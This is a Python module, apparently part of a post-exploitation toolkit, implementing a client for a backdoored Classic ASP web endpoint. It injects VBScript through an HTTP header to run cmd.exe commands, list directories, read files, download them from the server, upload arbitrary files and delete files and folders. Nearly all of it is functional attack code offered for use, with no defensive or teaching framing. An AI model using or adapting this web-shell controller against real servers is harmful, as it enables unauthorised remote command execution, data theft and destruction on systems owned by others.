from pathlib import Path  # get filename
import urllib.parse  # decode server responses
import requests  # HTTP requests
from Exceptions import *
from ExploitProcessor import ExploitProcessor

"""
@brief The ASPClassicExploitProcessor class is an class that accepts commands
        passed into it and processes it to be sent to the backdoored Classic
        ASP endpoint.
        Inherits from the ExploitProcessor class. 
"""
class ASPClassicExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__(host, path, method, header)
        
    """
    @brief Run commands to be interpreted as Python.
    @param command the command to be ran as a string
    @return any output received from the HTTP header.
    @throw CommandException if there is a connection error.
    """
    def __eval(self, command: str):
        res = self._Base__send_message(
            f"{command}"
        )
        return res
    
    """
    @brief Check if a file exists on the server.
    @param name the filename to be checked.
    @return a bool indicating whether or not the file exists.
    @throw CommandException if there is a connection error.
    """
    def __file_exists(self, file: str):
        filePath = self.directory + "\\" + file.replace("/", "\\")
        res = self.__eval(
            "Set fileSys = "
                "Server.CreateObject(\"Scripting.FileSystemObject\"):"
            f"If fileSys.FileExists(\"{filePath}\") Then:"
                f"Response.AddHeader \"{self.header}\", \"1\":"
            "Else:"
                f"Response.AddHeader \"{self.header}\", \"0\":"
            "End If:"
        )
        return res == '1'
    
    """
    @brief Run a command in a new XP shell opened server side, automatically
        changes directory to current working directory.
    @param command the command to be ran.
    @return stdout of the command.
    """
    def __run(self, options: str):
        options = (options  # escape
                   .replace("\"", "\"\"")  # double quotes
                   .replace("\n", "\" & vbCrLf & \"")  # new lines
        )
        res = self.__eval(  # The options is not base64 encoded, so some things
                            # like carriage return won't be escaped, and this
                            # could cause transmission errors.
            "Set objShell = Server.CreateObject(\"WScript.Shell\"):"
            "Set fileSys = "
                "Server.CreateObject(\"Scripting.FileSystemObject\"):"
            "fileName = Server.MapPath(\"/\") & \"\\\" & "
                "fileSys.GetTempName( ):"
            f"Call objShell.Run (\"cmd /c cd \"\"{self.directory}\"\" &&"
                f" ({options}) > \" & fileName, 0, True):"
            "Set oFile = fileSys.OpenTextFile (fileName, 1, False, 0):"
            "If Not oFile.AtEndOfStream Then:"
                f"Response.AddHeader \"{self.header}\", "
                    "Server.URLEncode(oFile.ReadAll):"
            "Else:"
                f"Response.AddHeader \"{self.header}\", \"\":"
            "End If:"
            "oFile.Close:"
            "Call fileSys.DeleteFile(fileName, True):"
        )
        return urllib.parse.unquote_plus(res)

    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            return self._Base__send_message(
                f"Response.AddHeader \"{self.header}\", "
                "Server.MapPath(\"/\") & \"\\\":")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
    
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            if response.text:  # print errors if they exist
                print(response.text)
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except Exception as e:
            raise CommandException(f"Message was not successfully processed.")

    """
    @brief See base class for details.
    """
    def _Base__version(self, options: str):
        res = self.__eval(
                f"Response.AddHeader \"{self.header}\", "
                "ScriptEngine & \" \" & "
                "ScriptEngineBuildVersion & \" \" & "
                "ScriptEngineMajorVersion & \".\" & "
                "ScriptEngineMinorVersion & \"|\" & "
                "request.serverVariables(\"server_software\"):")
        print(
            f"Scripting Engine: {res.split('|', 1)[0]}\n"
            f"Web Server: {res.split('|', 1)[1]}"
        )

    """
    @brief See base class for details.
    """
    def _Base__pwd(self, options: str):
        res = self.__run(
                "cd")
        print(res, end='')

    """
    @brief See base class for details.
    """
    def _Base__ls(self, options: str):
        res = self.__eval(
            "Dim out: out = \"\":"
            "Set fileSys = "
                "Server.CreateObject(\"Scripting.FileSystemObject\"):"
            f"Set directory = fileSys.GetFolder(\"{self.directory}\"):"
            "For Each f in directory.Files:"
                "out = out & f.Name & \" \":"  # fence post
            "Next:"
            "For Each d in directory.SubFolders:"
                "out = out & d.Name & \" \":"  # fense post
            "Next:"
            f"Response.AddHeader \"{self.header}\", out:"
        )
        print(res)

    """
    @brief See base class for details.
    """
    def _Base__run(self, options: str):
        print(self.__run(options), end='')
        
    """
    @brief See base class for details.
    """
    def _Base__cd(self, options: str):
        if not options:
            raise CommandException("Specify a directory")
        res = self.__run(
            f"cd {options} && cd"
        )

        if not res:
            raise CommandException("Invalid directory")
        
        self.directory = (res
                          .replace("\n", "")
                          .replace("\r", ""))
        print(res, end='')

    """
    @brief See base class for details.
    """
    def _Base__cat(self, options: str):
        if not options:
            raise CommandException("Specify a file to print")
        
        filePath = self.directory + "\\" + options.replace("/", "\\")
        res = self.__eval(
            "Set fileSys = "
                "Server.CreateObject(\"Scripting.FileSystemObject\"):"
            f"If fileSys.FileExists(\"{filePath}\") Then:"
                "Set oFile = fileSys.OpenTextFile "
                    f"(\"{filePath}\", 1, False, 0):"
                "If Not oFile.AtEndOfStream Then:"
                    f"Response.AddHeader \"{self.header}\", "
                        "Server.URLEncode(oFile.ReadAll):"
                "Else:"
                    f"Response.AddHeader \"{self.header}\", \"\":"
                "End If:"
            "Else:"
                f"Response.AddHeader \"{self.header}\", "
                    "\"File does not exist.\":"
            "End If:"
        )
        print(urllib.parse.unquote_plus(res), end='')

    """
    @brief See base class for details.
    """
    def _Base__download(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to download.")
        
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            filePath = self.directory + "\\" + options.replace("/", "\\")
            message = (
                "Set fileSys = "
                    "Server.CreateObject(\"Scripting.FileSystemObject\"):"
                f"If fileSys.FileExists(\"{filePath}\") Then:"
                    f"Set oFile = fileSys.GetFile(\"{filePath}\"):"
                    "With oFile.OpenAsTextStream():"
                        "Response.BinaryWrite .Read(oFile.Size):"
                        ".Close:"
                    "End With:"
                    f"Response.AddHeader \"{self.header}\", \"Done.\":"
                "Else:"
                    f"Response.AddHeader \"{self.header}\", "
                        "\"File does not exist.\":"
                "End If:"
            )
            print("Downloading file...")
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            data = response.content
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            if response.headers[self.header] == 'Done.':
                path = Path('downloads/' + Path(options).name)
                path.parent.mkdir(parents=True, exist_ok=True)
                with open(path, "wb") as bin_file:
                    bin_file.write(data)
            print(response.headers[self.header])
        except Exception as e:
            raise CommandException(f"Message was not successfully processed.")

    """
    @brief See base class for details.
    """
    def _Base__upload(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to upload.")
        local_file_path = Path(options)
        if not local_file_path.exists():
            raise CommandException("File does not exist.")
        if not local_file_path.is_file():
            raise CommandException("File is not a file.")
        
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            if self.__file_exists(local_file_path.name):  # uncomment me after debugging
                choice = input("Override existing file? [y/N] ")
                if not choice.lower().startswith('y'):
                    return
            filePath = self.directory + "\\" + options.replace("/", "\\")
            message = (
                "Set fileSys = "
                    "Server.CreateObject(\"Scripting.FileSystemObject\"):"
                f"With fileSys.createTextFile(\"{filePath}\"):"
                    "Set adodb = Server.CreateObject(\"ADODB.Stream\"):"
                    "adodb.Type = 1:"
                    "adodb.Open:"
                    "Dim bSize: bSize = Request.TotalBytes:"
                    "adodb.Write(Request.BinaryRead(bSize)):"
                    "adodb.Position = 0:adodb.Type = 2:"
                    "adodb.Charset = \"iso-8859-1\":"
                    ".Write(adodb.ReadText()):"
                    "adodb.Close:"
                    ".Close:"
                "End With:"
                f"Response.AddHeader \"{self.header}\", \"Done.\":"
            )
            print("Uploading file...")
            binary = local_file_path.read_bytes()

            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message },
                data=binary
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")

            print(response.headers[self.header])
        except Exception as e:
            raise CommandException(f"Message was not successfully processed.")

    """
    @brief See base class for details.
    """
    def _Base__rm(self, options: str):
        filePath = self.directory + "\\" + options.replace("/", "\\")
        res = self.__eval(
            "Set fileSys = "
                "Server.CreateObject(\"Scripting.FileSystemObject\"):"
            f"If Not fileSys.FileExists(\"{filePath}\") And "
                f"Not fileSys.FolderExists(\"{filePath}\") Then:"
                f"Response.AddHeader \"{self.header}\", "
                    "\"File does not exist.\":"
            "End If:"
            f"If fileSys.FileExists(\"{filePath}\") Then:"
                f"Call fileSys.DeleteFile(\"{filePath}\", True):"
                f"Response.AddHeader \"{self.header}\", \"Done.\":"
            f"End If:"
            f"If fileSys.FolderExists(\"{filePath}\") Then:"
                f"Call fileSys.DeleteFolder(\"{filePath}\", True):"
                f"Response.AddHeader \"{self.header}\", \"Done.\":"
            "End If:"
        )
        print(res)

    """
    @brief See base class for details.
    """
    def _Base__mkdir(self, options: str):
        pass
